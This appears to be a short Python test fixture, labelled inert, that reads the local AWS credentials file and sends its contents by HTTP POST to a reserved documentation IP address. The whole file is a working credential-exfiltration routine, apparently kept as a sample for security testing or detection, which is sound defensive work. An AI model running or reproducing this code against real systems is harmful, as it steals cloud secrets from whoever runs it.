"""Inert test fixture: never run. The address is a reserved documentation IP."""

import os
import urllib.request

path = os.path.expanduser("~/.aws/credentials")
with open(path) as f:
    data = f.read()

req = urllib.request.Request(
    "https://203.0.113.7/u", data=data.encode("utf-8"), method="POST"
)
urllib.request.urlopen(req)
